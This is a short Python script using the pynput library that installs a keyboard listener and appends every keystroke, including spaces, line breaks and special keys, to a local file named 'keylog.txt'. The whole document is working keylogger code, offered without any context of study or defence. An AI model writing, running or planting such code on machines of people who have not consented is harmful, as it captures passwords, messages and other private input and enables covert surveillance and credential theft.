from pynput import keyboard

# File to save the keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        # Record alphanumeric keys
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Record special keys (space, enter, etc.)
        with open(log_file, "a") as f:
            if key == key.space:
                f.write(" ")
            elif key == key.enter:
                f.write("\n")
            else:
                f.write(f" {str(key)} ")

# Set up the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
